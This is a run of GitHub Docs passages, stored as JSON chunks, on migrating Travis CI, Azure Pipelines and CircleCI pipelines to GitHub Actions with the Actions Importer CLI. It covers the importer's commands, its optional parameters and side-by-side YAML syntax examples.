{% data variables.product.prodname_actions %} workflow.\n1. Generates a report that summarizes how complete and complex of a migration is possible with {% data variables.product.prodname_actions_importer %}.\n\n\n\nRunning the audit command\n\nTo perform an audit of a Travis CI server, run the following command in your terminal:\n\n```shell\ngh actions-importer audit travis-ci --output-dir tmp/audit\n```\n\n\n\nInspecting the audit results\n\n{% data reusables.actions.gai-inspect-audit %}\n\n\n\nForecast potential build runner usage\n\nYou can use the `forecast` command to forecast potential {% data variables.product.prodname_actions %} usage by computing metrics from completed pipeline runs in your Travis CI server.\n\n\n\nRunning the forecast command\n\nTo perform a forecast of potential {% data variables.product.prodname_actions %} usage, run the following command in your terminal. By default, {% data variables.product.prodname_actions_importer %} includes the previous seven days in the forecast report.\n\n```shell\ngh actions-importer forecast travis-ci --output-dir tmp/forecast\n```\n\n\n\nInspecting the forecast report\n\nThe `forecast_report.md` file in the specified output directory contains the results of the forecast.\n\nListe", "Y2h1bmtfM19pbmRleF8xNjI=": "d below are some key terms that can appear in the forecast report:\n\n- The **job count** is the total number of completed jobs.\n- The **pipeline count** is the number of unique pipelines used.\n- **Execution time** describes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of {% data variables.product.prodname_dotcom %}-hosted runners.\n  - This metric is correlated to how much you should expect to spend in {% data variables.product.prodname_actions %}. This will vary depending on the hardware used for these minutes. You can use the {% data variables.product.prodname_actions %} pricing calculator to estimate the costs.\n- **Queue time** metrics describe the amount of time a job spent waiting for a runner to be available to execute it.\n- **Concurrent jobs** metrics describe the amount of jobs running at any given time. This metric can be used to define the number of runners you should configure.\n\nAdditionally, these metrics are defined for each queue of runners in Travis CI. This is especially useful if there is a mix of hosted or self-hosted runners, or high or low spec machines, so you can see metrics specific to different types of runners.\n\n\n\nPerform a dry-run migration of a Travis CI pipeline\n\nYou can use the `dry-run` command to convert a Travis CI pipeline to an equivalent {% data variables.product.prodname_actions %} workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline.\n\nTo perform a dry run of migrating your Travis CI pipelines to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing `my-travis-ci-repository` with the name of your Travis CI repository.\n\n```shell\ngh actions-importer dry-run travis-ci --travis-ci-repository my-travis-ci-repository --output-dir tmp/dry-run\n```\n\nYou can view the logs of the dry run and the converted workflow files in the specified output directory.\n\n{% data reusables.actions.gai-custom-transformers-rec %}\n\n\n\nPerform ", "Y2h1bmtfNF9pbmRleF8xNjI=": "a production migration of a Travis CI pipeline\n\nYou can use the `migrate` command to convert a Travis CI pipeline and open a pull request with the equivalent {% data variables.product.prodname_actions %} workflow.\n\n\n\nRunning the migrate command\n\nTo migrate a Travis CI pipeline to {% data variables.product.prodname_actions %}, run the following command in your terminal, replacing the `target-url` value with the URL for your {% data variables.product.prodname_dotcom %} repository, and `my-travis-ci-repository` with the name of your Travis CI repository.\n\n```shell\ngh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository\n```\n\nThe command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:\n\n```shell\n$ gh actions-importer migrate travis-ci --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate --travis-ci-repository my-travis-ci-repository\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n{% data reusables.actions.gai-inspect-pull-request %}\n\n\n\nReference\n\nThis section contains reference information on environment variables, optional arguments, and supported syntax when using {% data variables.product.prodname_actions_importer %} to migrate from Travis CI.\n\n\n\nUsing environment variables\n\n{% data reusables.actions.gai-config-environment-variables %}\n\n{% data variables.product.prodname_actions_importer %} uses the following environment variables to connect to your Travis CI instance:\n\n- `GITHUB_ACCESS_TOKEN`: The {% data variables.product.pat_v1 %} used to create pull requests with a converted workflow (requires the `workflow` scope).\n- `GITHUB_INSTANCE_URL`: The URL to the target {% data variables.product.prodname_dotcom %} instance (for example, `https://github.com`).\n- ", "Y2h1bmtfNV9pbmRleF8xNjI=": "`TRAVIS_CI_ACCESS_TOKEN`: The Travis CI API access token used to view Travis CI resources.\n- `TRAVIS_CI_ORGANIZATION`: The organization name of your Travis CI instance.\n- `TRAVIS_CI_INSTANCE_URL`: The URL of the Travis CI instance.\n- `TRAVIS_CI_SOURCE_GITHUB_ACCESS_TOKEN`: (Optional) The {% data variables.product.pat_generic %} used to authenticate with your source GitHub instance. If not provided, `GITHUB_ACCESS_TOKEN` will be used instead.\n- `TRAVIS_CI_SOURCE_GITHUB_INSTANCE_URL`: (Optional) The URL to the source GitHub instance, such as https://github.com. If not provided, `GITHUB_INSTANCE_URL` will be used instead.\n\nThese environment variables can be specified in a `.env.local` file that is loaded by {% data variables.product.prodname_actions_importer %} when it is run.\n\n\n\nUsing optional arguments\n\n{% data reusables.actions.gai-optional-arguments-intro %}\n\n\n\n`--source-file-path`\n\nYou can use the `--source-file-path` argument with the `forecast`, `dry-run`, or `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions_importer %} fetches pipeline contents from source control. The `--source-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source file path instead.\n\nFor example:\n\n```shell\ngh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --source-file-path ./path/to/.travis.yml\n```\n\n\n\n`--allow-inactive-repositories`\n\nYou can use this argument to specify whether {% data variables.product.prodname_actions_importer %} should include inactive repositories in an audit. If this option is not set, inactive repositories are not included in audits.\n\n```shell\ngh actions-importer dry-run travis-ci --output-dir ./path/to/output/ --travis-ci-repository my-travis-ci-repository --allow-inactive-repositories\n```\n\n\n\n`--config-file-path`\n\nYou can use the `--config-file-path` argument with the `audit`, `dry-run`, and `migrate` subcommands.\n\nBy default, {% data variables.product.prodname_actions", "Y2h1bmtfNl9pbmRleF8xNjI=": "_importer %} fetches pipeline contents from source control. The `--config-file-path` argument tells {% data variables.product.prodname_actions_importer %} to use the specified source files instead.\n\n\n\nAudit example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file to perform an audit.\n\n```shell\ngh actions-importer audit travis-ci --output-dir ./path/to/output/ --config-file-path ./path/to/travis-ci/config.yml\n```\n\nTo audit a Travis CI instance using a configuration file, the file must be in the following format and each `repository_slug` value must be unique:\n\n```yaml\nsource_files:\n  - repository_slug: travis-org-name/travis-repo-name\n    path: path/to/.travis.yml\n  - repository_slug: travis-org-name/some-other-travis-repo-name\n    path: path/to/.travis.yml\n```\n\n\n\nDry run example\n\nIn this example, {% data variables.product.prodname_actions_importer %} uses the specified YAML configuration file as the source file to perform a dry run.\n\nThe pipeline is selected by matching the `repository_slug` in the configuration file to the value of the `--travis-ci-repository` option. The `path` is then used to pull the specified source file.\n\n```shell\ngh actions-importer dry-run travis-ci --travis-ci-repository travis-org-name/travis-repo-name --output-dir ./output/ --config-file-path ./path/to/travis-ci/config.yml\n```\n\n\n\nSupported project languages\n\n{% data variables.product.prodname_actions_importer %} supports migrating Travis CI projects in the following languages.\n\n\nandroid\nbash\nc\nclojure\nc++\ncrystal\nc#\nd\ndart\nelixir\nerlang\ngeneric\ngo\ngroovy\nhaskell\nhaxe\njava\njulia\nmatlab\nminimal\nnix\nnode_js\nobjective-c\nperl\nperl6\nphp\npython\nr\nruby\nrust\nscala\nsh\nshell\nsmalltalk\nswift\n\n\n\n\nSupported syntax for Travis CI pipelines\n\nThe following table shows the type of properties {% data variables.product.prodname_actions_importer %} is currently able to convert. For more details about how Travis CI pipeline syntax aligns with {% data variables.product.prodname_actions %}, see", "Y2h1bmtfN19pbmRleF8xNjI=": " \"AUTOTITLE\".\n\n| Travis CI    | GitHub Actions                     |              Status |\n| :------------------ | :--------------------------------- | ------------------: |\n| branches            | `on..`|           Supported |\n| build_pull_requests | `on.`   |           Supported |\n| env                 | `env` `jobs..env``jobs..steps.env`                                                               |           Supported |\n| if                  | `jobs..if`       |           Supported |\n| job                 | `jobs.``jobs..name` |           Supported |\n| matrix              | `jobs..strategy``jobs..strategy.fail-fast``jobs..strategy.matrix`                 |           Supported |\n| os & dist           | `runners`        |           Supported |\n| scripts             | `jobs..steps`    |           Supported |\n| stages              | `jobs`           |           Supported |\n| env                 | `on`                               | Partially supported |\n| branches            | `on..``on..paths`                                                                     |         Unsupported |\n| build_pull_requests | `on..``on..``on..paths`                          |         Unsupported |\n| cron triggers       | `on.schedule``on.workflow_run` |         Unsupported |\n| env                 | `jobs..timeout-minutes``on..types`                                                                     |         Unsupported |\n| job                 | `jobs..container`          |         Unsupported |\n| os & dist           | `self hosted runners`         |         Unsupported |\n\nFor information about supported Travis CI constructs, see the `github/gh-actions-importer` repository.\n\n\n\nEnvironment variables syntax\n\n{% data variables.product.prodname_actions_importer %} uses the mapping in the table below to convert default Travis CI environment variables to the closest equivalent in {% data variables.product.prodname_actions %}.\n\n| Travis CI                     | GitHub Actions                                                            ", "Y2h1bmtfOF9pbmRleF8xNjI=": "            |\n| :---------------------------- | :------------------------------------------------------------------------------------ |\n| {% raw %}`$CONTINUOUS_INTEGRATION`{% endraw %}     | {% raw %}`$CI`{% endraw %}                                                                                 |\n| {% raw %}`$USER`{% endraw %}                       | {% raw %}`${{ github.actor }}`{% endraw %}                                                          |\n| {% raw %}`$HOME`{% endraw %}                       | {% raw %}`${{ github.workspace }}`      {% endraw %}                                                       |\n| {% raw %}`$TRAVIS_BRANCH`{% endraw %}             | {% raw %}`${{ github.ref }}`{% endraw %}                                                                   |\n| {% raw %}`$TRAVIS_BUILD_DIR`{% endraw %}           | {% raw %}`${{ github.workspace }}`{% endraw %}                                                             |\n| {% raw %}`$TRAVIS_BUILD_ID`{% endraw %}            | {% raw %}`${{ github.run_number }}`{% endraw %}                                                            |\n| {% raw %}`$TRAVIS_BUILD_NUMBER`{% endraw %}        | {% raw %}`${{ github.run_id }}`{% endraw %}                                                                |\n| {% raw %}`$TRAVIS_COMMIT`{% endraw %}              | {% raw %}`${{ github.sha }}`{% endraw %}                                                                   |\n| {% raw %}`$TRAVIS_EVENT_TYPE`{% endraw %}          | {% raw %}`${{ github.event_name }}`{% endraw %}                                                            |\n| {% raw %}`$TRAVIS_PULL_REQUEST_BRANCH`{% endraw %} | {% raw %}`${{ github.base_ref }}`{% endraw %}                                                              |\n| {% raw %}`$TRAVIS_PULL_REQUEST`{% endraw %}        | {% raw %}`${{ github.event.number }}`{% endraw %}                                                          |\n| {% raw %}`$TRAVIS_PULL_REQUEST_SHA`{% endraw %}    | {% raw %}`${{ github.head.sha }}`{% endraw %}                ", "Y2h1bmtfOV9pbmRleF8xNjI=": "                                              |\n| {% raw %}`$TRAVIS_PULL_REQUEST_SLUG`{% endraw %}   | {% raw %}`${{ github.repository }}`{% endraw %}                                                            |\n| {% raw %}`$TRAVIS_TAG`{% endraw %}                 | {% raw %}`${{ github.ref }}`{% endraw %}                                                                   |\n| {% raw %}`$TRAVIS_OS_NAME`{% endraw %}             | {% raw %}`${{ runner.os }}`{% endraw %}                                                                    |\n| {% raw %}`$TRAVIS_JOB_ID`{% endraw %}              | {% raw %}`${{ github.job }}`{% endraw %}                                                                   |\n| {% raw %}`$TRAVIS_REPO_SLUG`{% endraw %}           | {% raw %}`${{ github.repository_owner/github.repository }}`{% endraw %}                                    |\n| {% raw %}`$TRAVIS_BUILD_WEB_URL`{% endraw %}       | {% raw %}`${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}`{% endraw %} |\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNjM=": "\n\nOptional parameters\n\n{% data variables.product.prodname_actions_importer %} has several optional parameters that you can use to customize the migration process.\n\n\n\nLimiting allowed actions\n\nThe following options can be used to limit which actions are allowed in converted workflows. When used in combination, these options expand the list of allowed actions. If none of these options are supplied, then all actions are allowed.\n\n- `--allowed-actions` specifies a list of actions to allow in converted workflows. Wildcards are supported. Any other actions other than those provided will be disallowed.\n\n  For example:\n\n  ```shell\n  --allowed-actions {% data reusables.actions.action-checkout %} actions/upload-artifact@* my-org/*\n  ```\n\n  You can provide an empty list to disallow all actions. For example, `--allowed-actions=`.\n\n- `--allow-verified-actions` specifies that all actions from verified creators are allowed.\n\n- `--allow-github-created-actions` specifies that actions published from the `github` or `actions` organizations are allowed.\n\n  For example, such actions include `github/super-linter` and `actions/checkout`.\n\n  This option is equivalent to `--allowed-actions actions/* github/*`.\n\n\n\nUsing a credentials file for authentication\n\nThe `--credentials-file` parameter specifies the path to a file containing credentials for different servers that {% data variables.product.prodname_actions_importer %} can authenticate to. This is useful when build scripts (such as `.travis.yml` or `jenkinsfile`) are stored in multiple {% data variables.product.prodname_ghe_server %} instances.\n\nA credentials file must be a YAML file containing a list of server and access token combinations. {% data variables.product.prodname_actions_importer %} uses the credentials for the URL that most closely matches the network request being made.\n\nFor example:\n\n```yaml\n- url: https://github.com\n  access_token: ghp_mygeneraltoken\n- url: https://github.com/specific_org/\n  access_token: ghp_myorgspecifictoken\n- url: https://jenkins.org\n  access_tok", "Y2h1bmtfMV9pbmRleF8xNjM=": "en: abc123\n  username: marty_mcfly\n```\n\nFor the above credentials file, {% data variables.product.prodname_actions_importer %} uses the access token `ghp_mygeneraltoken` to authenticate all network requests to `https://github.com`, _unless_ the network request is for a repository in the `specific_org` organization. In that case, the `ghp_myorgspecifictoken` token is used to authenticate instead.\n\n\n\nAlternative source code providers\n\n{% data variables.product.prodname_actions_importer %} can automatically fetch source code from non-{% data variables.product.prodname_dotcom %} repositories. A credentials file can specify the `provider`, the provider URL, and the credentials needed to retrieve the source code.\n\nFor example:\n\n```yaml\n- url: https://gitlab.com\n  access_token: super_secret_token\n  provider: gitlab\n```\n\nFor the above example, {% data variables.product.prodname_actions_importer %} uses the token `super_secret_token` to retrieve any source code that is hosted on `https://gitlab.com`.\n\nSupported values for `provider` are:\n\n- `github` (default)\n- `gitlab`\n- `bitbucket_server`\n- `azure_devops`\n\n\n\nControlling optional features\n\nYou can use the `--features` option to limit the features used in workflows that {% data variables.product.prodname_actions_importer %} creates. This is useful for excluding newer {% data variables.product.prodname_actions %} syntax from workflows when migrating to an older {% data variables.product.prodname_ghe_server %} instance. When using the `--features` option, you must specify the version of {% data variables.product.prodname_ghe_server %} that you are migrating to.\n\nFor example:\n\n```shell\ngh actions-importer dry-run ... --features ghes-3.3\n```\n\nThe supported values for `--features` are:\n\n- `all` (default value)\n- `ghes-latest`\n- `ghes-`, where `` is the version of {% data variables.product.prodname_ghe_server %}, `3.0` or later. For example, `ghes-3.3`.\n\nYou can view the list of available feature flags by {% data variables.product.prodname_actions_importer %} by running the `li", "Y2h1bmtfMl9pbmRleF8xNjM=": "st-features` command. For example:\n\n```shell copy\ngh actions-importer list-features\n```\n\nYou should see an output similar to the following.\n\n\n\n```shell\nAvailable feature flags:\n\nactions/cache (disabled):\n        Control usage of actions/cache inside of workflows. Outputs a comment if not enabled.\n        GitHub Enterprise Server >= ghes-3.5 required.\n\ncomposite-actions (enabled):\n        Minimizes resulting workflow complexity through the use of composite actions. See https://docs.github.com/en/actions/creating-actions/creating-a-composite-action for more information.\n        GitHub Enterprise Server >= ghes-3.4 required.\n\nreusable-workflows (disabled):\n        Avoid duplication by re-using existing workflows. See https://docs.github.com/en/actions/using-workflows/reusing-workflows for more information.\n        GitHub Enterprise Server >= ghes-3.4 required.\n\nworkflow-concurrency-option-allowed (enabled):\n        Allows the use of the `concurrency` option in workflows. See https://docs.github.com/en/actions/reference/workflow-syntax-for-github-actions#concurrency for more information.\n        GitHub Enterprise Server >= ghes-3.2 required.\n\nEnable features by passing --enable-features feature-1 feature-2\nDisable features by passing --disable-features feature-1 feature-2\n```\n\n\n\nTo toggle feature flags, you can use either of the following methods:\n- Use the `--enable-features` and `--disable-features` options when running a `gh actions-importer` command.\n- Use an environment variable for each feature flag.\n\nYou can use the `--enable-features` and `--disable-features` options to select specific features to enable or disable for the duration of the command.\nFor example, the following command disables use of `actions/cache` and `composite-actions`:\n\n```shell\ngh actions-importer dry-run ... --disable-features=composite-actions actions/cache\n```\n\nYou can use the `configure --features` command to interactively configure feature flags and automatically write them to your environment:\n\n```shell\n$ gh actions-importer configur", "Y2h1bmtfM19pbmRleF8xNjM=": "e --features\n\n\u2714 Which features would you like to configure?: actions/cache, reusable-workflows\n\u2714 actions/cache (disabled): Enable\n? reusable-workflows (disabled):\n\u203a Enable\n  Disable\n```\n\n\n\nDisabling network response caching\n\nBy default, {% data variables.product.prodname_actions_importer %} caches responses from network requests to reduce network load and reduce run time. You can use the `--no-http-cache` option to disable the network cache. For example:\n\n```shell\ngh actions-importer forecast ... --no-http-cache\n```\n\n\n\nPath arguments\n\nWhen running {% data variables.product.prodname_actions_importer %}, path arguments are relative to the container's disk, so absolute paths relative to the container's host machine are not supported. When {% data variables.product.prodname_actions_importer %} is run, the container's `/data` directory is mounted to the directory where {% data variables.product.prodname_actions_importer %} is run.\n\nFor example, the following command, when used in the `/Users/mona` directory, outputs the {% data variables.product.prodname_actions_importer %} audit summary to the `/Users/mona/out` directory:\n\n```shell\ngh actions-importer audit --output-dir /data/out\n```\n\n\n\nUsing a proxy\n\nTo access servers that are configured with a HTTP proxy, you must set the following environment variables with the proxy's URL:\n\n- `OCTOKIT_PROXY`: for any {% data variables.product.prodname_dotcom %} server.\n- `HTTP_PROXY` (or `HTTPS_PROXY`): for any other servers.\n\nFor example:\n\n```shell\nexport OCTOKIT_PROXY=https://proxy.example.com:8443\nexport HTTPS_PROXY=$OCTOKIT_PROXY\n```\n\nIf the proxy requires authentication, a username and password must be included in the proxy URL. For example, `https://username:password@proxy.url:port`.\n\n\n\nDisabling SSL certificate verification\n\nBy default, {% data variables.product.prodname_actions_importer %} verifies SSL certificates when making network requests. You can disable SSL certificate verification with the `--no-ssl-verify` option. For example:\n\n```shell\ngh actions-importer audit ", "Y2h1bmtfNF9pbmRleF8xNjM=": "--output-dir ./output --no-ssl-verify\n```\n\n\n\nLegal notice\n\n{% data reusables.actions.actions-importer-legal-notice %}\n\n", "Y2h1bmtfMF9pbmRleF8xNjQ=": "\n\nIntroduction\n\nAzure Pipelines and {% data variables.product.prodname_actions %} both allow you to create workflows that automatically build, test, publish, release, and deploy code. Azure Pipelines and {% data variables.product.prodname_actions %} share some similarities in workflow configuration:\n\n- Workflow configuration files are written in YAML and are stored in the code's repository.\n- Workflows include one or more jobs.\n- Jobs include one or more steps or individual commands.\n- Steps or tasks can be reused and shared with the community.\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nKey differences\n\nWhen migrating from Azure Pipelines, consider the following differences:\n\n- Azure Pipelines supports a legacy _classic editor_, which lets you define your CI configuration in a GUI editor instead of creating the pipeline definition in a YAML file. {% data variables.product.prodname_actions %} uses YAML files to define workflows and does not support a graphical editor.\n- Azure Pipelines allows you to omit some structure in job definitions. For example, if you only have a single job, you don't need to define the job and only need to define its steps. {% data variables.product.prodname_actions %} requires explicit configuration, and YAML structure cannot be omitted.\n- Azure Pipelines supports _stages_ defined in the YAML file, which can be used to create deployment workflows. {% data variables.product.prodname_actions %} requires you to separate stages into separate YAML workflow files.\n- On-premises Azure Pipelines build agents can be selected with capabilities. {% data variables.product.prodname_actions %} self-hosted runners can be selected with labels.\n\n\n\nMigrating jobs and steps\n\nJobs and steps in Azure Pipelines are very similar to jobs and steps in {% data variables.product.prodname_actions %}. In both systems, jobs have the following characteristics:\n\n- Jobs contain a series of steps that run sequentially.\n- Jobs run on separate virtual machines or in separate containers.\n- Jobs run in parallel by default, bu", "Y2h1bmtfMV9pbmRleF8xNjQ=": "t can be configured to run sequentially.\n\n\n\nMigrating script steps\n\nYou can run a script or a shell command as a step in a workflow. In Azure Pipelines, script steps can be specified using the `script` key, or with the `bash`, `powershell`, or `pwsh` keys. Scripts can also be specified as an input to the Bash task or the PowerShell task.\n\nIn {% data variables.product.prodname_actions %}, all scripts are specified using the `run` key. To select a particular shell, you can specify the `shell` key when providing the script. For more information, see \"AUTOTITLE.\"\n\nBelow is an example of the syntax for each system.\n\n\n\nAzure Pipelines syntax for script steps\n\n{% raw %}\n\n```yaml\njobs:\n  - job: scripts\n    pool:\n      vmImage: 'windows-latest'\n    steps:\n      - script: echo \"This step runs in the default shell\"\n      - bash: echo \"This step runs in bash\"\n      - pwsh: Write-Host \"This step runs in PowerShell Core\"\n      - task: PowerShell@2\n        inputs:\n          script: Write-Host \"This step runs in PowerShell\"\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for script steps\n\n{% raw %}\n\n```yaml\njobs:\n  scripts:\n    runs-on: windows-latest\n    steps:\n      - run: echo \"This step runs in the default shell\"\n      - run: echo \"This step runs in bash\"\n        shell: bash\n      - run: Write-Host \"This step runs in PowerShell Core\"\n        shell: pwsh\n      - run: Write-Host \"This step runs in PowerShell\"\n        shell: powershell\n```\n\n{% endraw %}\n\n\n\nDifferences in script error handling\n\nIn Azure Pipelines, scripts can be configured to error if any output is sent to `stderr`. {% data variables.product.prodname_actions %} does not support this configuration.\n\n{% data variables.product.prodname_actions %} configures shells to \"fail fast\" whenever possible, which stops the script immediately if one of the commands in a script exits with an error code. In contrast, Azure Pipelines requires explicit configuration to exit immediately on an error. For more information, see \"AUTOTITLE.\"\n\n\n\nDifferences in", "Y2h1bmtfMl9pbmRleF8xNjQ=": " the default shell on Windows\n\nIn Azure Pipelines, the default shell for scripts on Windows platforms is the Command shell (_cmd.exe_). In {% data variables.product.prodname_actions %}, the default shell for scripts on Windows platforms is PowerShell. PowerShell has several differences in built-in commands, variable expansion, and flow control.\n\nIf you're running a simple command, you might be able to run a Command shell script in PowerShell without any changes. But in most cases, you will either need to update your script with PowerShell syntax or instruct {% data variables.product.prodname_actions %} to run the script with the Command shell instead of PowerShell. You can do this by specifying `shell` as `cmd`.\n\nBelow is an example of the syntax for each system.\n\n\n\nAzure Pipelines syntax using CMD by default\n\n{% raw %}\n\n```yaml\njobs:\n  - job: run_command\n    pool:\n      vmImage: 'windows-latest'\n    steps:\n      - script: echo \"This step runs in CMD on Windows by default\"\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for specifying CMD\n\n{% raw %}\n\n```yaml\njobs:\n  run_command:\n    runs-on: windows-latest\n    steps:\n      - run: echo \"This step runs in PowerShell on Windows by default\"\n      - run: echo \"This step runs in CMD on Windows explicitly\"\n        shell: cmd\n```\n\n{% endraw %}\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nMigrating conditionals and expression syntax\n\nAzure Pipelines and {% data variables.product.prodname_actions %} can both run steps conditionally. In Azure Pipelines, conditional expressions are specified using the `condition` key. In {% data variables.product.prodname_actions %}, conditional expressions are specified using the `if` key.\n\nAzure Pipelines uses functions within expressions to execute steps conditionally. In contrast, {% data variables.product.prodname_actions %} uses an infix notation. For example, you must replace the `eq` function in Azure Pipelines with the `==` operator in {% data variables.product.prodname_actions %}.\n\nBelow is an example of the", "Y2h1bmtfM19pbmRleF8xNjQ=": " syntax for each system.\n\n\n\nAzure Pipelines syntax for conditional expressions\n\n{% raw %}\n\n```yaml\njobs:\n  - job: conditional\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - script: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        condition: and(eq(variables.str, 'ABC'), eq(variables.num, 123))\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for conditional expressions\n\n{% raw %}\n\n```yaml\njobs:\n  conditional:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This step runs with str equals 'ABC' and num equals 123\"\n        if: ${{ env.str == 'ABC' && env.num == 123 }}\n```\n\n{% endraw %}\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nDependencies between jobs\n\nBoth Azure Pipelines and {% data variables.product.prodname_actions %} allow you to set dependencies for a job. In both systems, jobs run in parallel by default, but job dependencies can be specified explicitly. In Azure Pipelines, this is done with the `dependsOn` key. In {% data variables.product.prodname_actions %}, this is done with the `needs` key.\n\nBelow is an example of the syntax for each system. The workflows start a first job named `initial`, and when that job completes, two jobs named `fanout1` and `fanout2` will run. Finally, when those jobs complete, the job `fanin` will run.\n\n\n\nAzure Pipelines syntax for dependencies between jobs\n\n{% raw %}\n\n```yaml\njobs:\n  - job: initial\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - script: echo \"This job will be run first.\"\n  - job: fanout1\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: initial\n    steps:\n      - script: echo \"This job will run after the initial job, in parallel with fanout2.\"\n  - job: fanout2\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: initial\n    steps:\n      - script: echo \"This job will run after the initial job, in parallel with fanout1.\"\n  - job: fanin:\n    pool:\n      vmImage: 'ubuntu-latest'\n    dependsOn: [fanout1, fanout2]\n    steps:\n      - script: echo \"This job will run after fanout1 a", "Y2h1bmtfNF9pbmRleF8xNjQ=": "nd fanout2 have finished.\"\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for dependencies between jobs\n\n{% raw %}\n\n```yaml\njobs:\n  initial:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first.\"\n  fanout1:\n    runs-on: ubuntu-latest\n    needs: initial\n    steps:\n      - run: echo \"This job will run after the initial job, in parallel with fanout2.\"\n  fanout2:\n    runs-on: ubuntu-latest\n    needs: initial\n    steps:\n      - run: echo \"This job will run after the initial job, in parallel with fanout1.\"\n  fanin:\n    runs-on: ubuntu-latest\n    needs: [fanout1, fanout2]\n    steps:\n      - run: echo \"This job will run after fanout1 and fanout2 have finished.\"\n```\n\n{% endraw %}\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nMigrating tasks to actions\n\nAzure Pipelines uses _tasks_, which are application components that can be re-used in multiple workflows. {% data variables.product.prodname_actions %} uses _actions_, which can be used to perform tasks and customize your workflow. In both systems, you can specify the name of the task or action to run, along with any required inputs as key/value pairs.\n\nBelow is an example of the syntax for each system.\n\n\n\nAzure Pipelines syntax for tasks\n\n{% raw %}\n\n```yaml\njobs:\n  - job: run_python\n    pool:\n      vmImage: 'ubuntu-latest'\n    steps:\n      - task: UsePythonVersion@0\n        inputs:\n          versionSpec: '3.7'\n          architecture: 'x64'\n      - script: python script.py\n```\n\n{% endraw %}\n\n\n\n{% data variables.product.prodname_actions %} syntax for actions\n\n```yaml\njobs:\n  run_python:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: '3.7'\n          architecture: 'x64'\n      - run: python script.py\n```\n\nYou can find actions that you can use in your workflow in {% data variables.product.prodname_marketplace %}, or you can create your own actions. For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xNjU=": "\n\nIntroduction\n\nCircleCI and {% data variables.product.prodname_actions %} both allow you to create workflows that automatically build, test, publish, release, and deploy code. CircleCI and {% data variables.product.prodname_actions %} share some similarities in workflow configuration:\n\n- Workflow configuration files are written in YAML and stored in the repository.\n- Workflows include one or more jobs.\n- Jobs include one or more steps or individual commands.\n- Steps or tasks can be reused and shared with the community.\n\nFor more information, see \"AUTOTITLE.\"\n\n\n\nKey differences\n\nWhen migrating from CircleCI, consider the following differences:\n\n- CircleCI\u2019s automatic test parallelism automatically groups tests according to user-specified rules or historical timing information. This functionality is not built into {% data variables.product.prodname_actions %}.\n- Actions that execute in Docker containers are sensitive to permissions problems since containers have a different mapping of users. You can avoid many of these problems by not using the `USER` instruction in your _Dockerfile_. {% ifversion ghae %}{% data reusables.actions.self-hosted-runners-software %}\n{% else %}For more information about the Docker filesystem on {% data variables.product.product_name %}-hosted runners, see \"AUTOTITLE.\"\n{% endif %}\n\n\n\nMigrating workflows and jobs\n\nCircleCI defines `workflows` in the _config.yml_ file, which allows you to configure more than one workflow. {% data variables.product.product_name %} requires one workflow file per workflow, and as a consequence, does not require you to declare `workflows`. You'll need to create a new workflow file for each workflow configured in _config.yml_.\n\nBoth CircleCI and {% data variables.product.prodname_actions %} configure `jobs` in the configuration file using similar syntax. If you configure any dependencies between jobs using `requires` in your CircleCI workflow, you can use the equivalent {% data variables.product.prodname_actions %} `needs` syntax. For more information, see \"AUT", "Y2h1bmtfMV9pbmRleF8xNjU=": "OTITLE.\"\n\n\n\nMigrating orbs to actions\n\nBoth CircleCI and {% data variables.product.prodname_actions %} provide a mechanism to reuse and share tasks in a workflow. CircleCI uses a concept called orbs, written in YAML, to provide tasks that people can reuse in a workflow. {% data variables.product.prodname_actions %} has powerful and flexible reusable components called actions, which you build with either JavaScript files or Docker images. You can create actions by writing custom code that interacts with your repository in any way you'd like, including integrating with {% data variables.product.product_name %}'s APIs and any publicly available third-party API. For example, an action can publish npm modules, send SMS alerts when urgent issues are created, or deploy production-ready code. For more information, see \"AUTOTITLE.\"\n\nCircleCI can reuse pieces of workflows with YAML anchors and aliases. {% data variables.product.prodname_actions %} supports the most common need for reusability using matrices. For more information about matrices, see \"AUTOTITLE.\"\n\n\n\nUsing Docker images\n\nBoth CircleCI and {% data variables.product.prodname_actions %} support running steps inside of a Docker image.\n\nCircleCI provides a set of pre-built images with common dependencies. These images have the `USER` set to `circleci`, which causes permissions to conflict with {% data variables.product.prodname_actions %}.\n\nWe recommend that you move away from CircleCI's pre-built images when you migrate to {% data variables.product.prodname_actions %}. In many cases, you can use actions to install the additional dependencies you need.\n\n{% ifversion ghae %}\nFor more information about the Docker filesystem, see \"AUTOTITLE.\"\n\n{% data reusables.actions.self-hosted-runners-software %}\n{% else %}\nFor more information about the Docker filesystem, see \"AUTOTITLE.\"\n\nFor 